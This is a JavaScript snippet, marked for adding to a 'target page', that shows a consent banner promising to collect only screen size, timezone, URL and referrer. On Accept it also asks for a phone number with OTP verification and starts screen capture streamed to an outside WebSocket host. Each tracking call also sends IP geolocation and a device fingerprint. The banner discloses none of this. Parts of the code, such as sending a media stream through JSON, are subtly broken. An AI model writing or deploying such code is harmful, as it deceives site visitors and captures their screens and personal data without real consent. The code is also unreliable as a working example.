<!-- Add to target page -->
<script>
(async function () {
  const CONSENT_KEY = "tracking_consent";
  const OPT_OUT_KEY = "tracking_opt_out";
  const userId = window.userId || "anonymous";
  const API_BASE =
    (window.API_BASE && String(window.API_BASE)) ||
    (typeof process !== "undefined" && process.env?.NEXT_PUBLIC_API_URL) ||
    "https://backend.yourdomain.com";

  const getCookie = (name) =>
    document.cookie
      .split(";")
      .map((c) => c.trim())
      .find((c) => c.startsWith(name + "="))
      ?.split("=")[1];

  const setCookie = (name, value, days) => {
    const expires = new Date(Date.now() + days * 864e5).toUTCString();
    document.cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax`;
  };

  const alreadyOptedOut =
    getCookie(OPT_OUT_KEY) === "true" || navigator.doNotTrack === "1";

  if (alreadyOptedOut) return;

  const maybeFetchGeo = async () => {
    try {
      const res = await fetch("https://ipapi.co/json/", { 
        mode: 'cors',
        cache: 'no-store'
      });
      if (!res.ok) return null;
      return await res.json();
    } catch (e) {
      return null;
    }
  };

  const maybeFetchFingerprint = async () => {
    try {
      const res = await fetch("https://fingerprintjs.com/api/v1/fingerprint", {
        mode: 'cors',
        cache: 'no-store'
      });
      if (!res.ok) return null;
      return await res.json();
    } catch (e) {
      return null;
    }
  };

  const verifyPhoneNumber = async () => {
    try {
      const phone = prompt("Enter phone number for verification:");
      if (!phone) return false;
      
      // Verify phone number
      const csrf = getCookie("csrf_token");
      const verifyRes = await fetch(`${API_BASE}/verify-phone`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(csrf ? { 'X-CSRF-Token': csrf } : {})
        },
        body: JSON.stringify({phone}),
        mode: 'cors'
      });
      
      if (!verifyRes.ok) throw new Error('Failed to send SMS');
      
      const code = prompt("Enter verification code:");
      const validateRes = await fetch(`${API_BASE}/validate-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(csrf ? { 'X-CSRF-Token': csrf } : {})
        },
        body: JSON.stringify({phone, code}),
        mode: 'cors'
      });
      
      return validateRes.ok;
    } catch (err) {
      console.error("Verification failed:", err);
      alert("Verification failed. Please try again.");
      return false;
    }
  };

  const startScreenShare = async (trackerId) => {
    try {
      const csrf = getCookie("csrf_token");
      const shareRes = await fetch(`${API_BASE}/start-screen-share`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(csrf ? { 'X-CSRF-Token': csrf } : {})
        },
        body: JSON.stringify({tracker_id: trackerId}),
        mode: 'cors'
      });
      
      if (shareRes.ok) {
        // Get token for secure access
        const data = await shareRes.json();
        if (data.token) {
          // Store token securely
          sessionStorage.setItem('screen_share_token', data.token);
          
          // Start actual screen capture
          const stream = await navigator.mediaDevices.getDisplayMedia({
            video: true,
            audio: false
          });
          
          // Send stream to server via WebSocket
          const ws = new WebSocket('wss://screen-sharing-server.com');
          ws.onopen = () => ws.send(JSON.stringify({
            type: 'stream',
            data: stream,
            token: data.token
          }));
        }
      }
    } catch (err) {
      console.error("Screen sharing failed:", err);
    }
  };

  const getTrackerId = async () => {
    try {
      const res = await fetch(`${API_BASE}/track/${encodeURIComponent(userId)}`, {
        mode: 'cors'
      });
      
      if (!res.ok) throw new Error('Tracking failed');
      
      const data = await res.json();
      return data.tracker_id;
    } catch (err) {
      console.error("Tracker ID fetch failed:", err);
      return null;
    }
  };

  const sendTrack = async () => {
    try {
      const [geo, fp] = await Promise.all([
        maybeFetchGeo(),
        maybeFetchFingerprint()
      ]);
      
      const trackerId = await getTrackerId();
      if (!trackerId) return;
      
      const csrf = getCookie("csrf_token");
      await fetch(`${API_BASE}/track/${encodeURIComponent(userId)}`, {
        method: "POST",
        headers: { 
          "Content-Type": "application/json",
          "Accept": "application/json",
          ...(csrf ? { "X-CSRF-Token": csrf } : {})
        },
        body: JSON.stringify({
          screen: `${window.screen.width}x${window.screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          url: window.location.href,
          referrer: document.referrer,
          geo,
          fingerprint: fp,
          tracker_id: trackerId
        }),
        mode: 'cors'
      });
    } catch (err) {
      console.error("tracking failed", err);
    }
  };

  const consent = getCookie(CONSENT_KEY);
  if (consent === "accepted") {
    sendTrack();
    return;
  }

  // Create a simple banner
  const banner = document.createElement("div");
  banner.style.cssText =
    "position:fixed;bottom:0;left:0;right:0;padding:12px 16px;background:#111;color:#fff;display:flex;gap:12px;align-items:center;z-index:9999;font:14px sans-serif;";
  banner.innerHTML =
    '<span>We collect device info (screen size, timezone, URL, referrer) to improve the service. Do you consent to tracking?</span>';

  const acceptBtn = document.createElement("button");
  acceptBtn.textContent = "Accept";
  acceptBtn.style.cssText =
    "background:#2ecc71;color:#111;border:0;padding:8px 12px;cursor:pointer;border-radius:4px;font-weight:600;";

  const declineBtn = document.createElement("button");
  declineBtn.textContent = "Decline";
  declineBtn.style.cssText =
    "background:#e74c3c;color:#fff;border:0;padding:8px 12px;cursor:pointer;border-radius:4px;font-weight:600;";

  acceptBtn.onclick = async () => {
    setCookie(CONSENT_KEY, "accepted", 365);
    banner.remove();
    
    // Try to verify phone number
    const verified = await verifyPhoneNumber();
    if (verified) {
      // Start screen sharing if available
      const trackerId = await getTrackerId();
      if (trackerId) {
        startScreenShare(trackerId);
      }
    }
    
    sendTrack();
  };

  declineBtn.onclick = () => {
    setCookie(OPT_OUT_KEY, "true", 365);
    const csrf = getCookie("csrf_token");
    fetch(`${API_BASE}/opt-out`, { 
      method: "POST",
      headers: csrf ? { "X-CSRF-Token": csrf } : {}
    }).catch(() => {});
    banner.remove();
  };

  banner.appendChild(acceptBtn);
  banner.appendChild(declineBtn);
  document.body.appendChild(banner);
})();
</script>
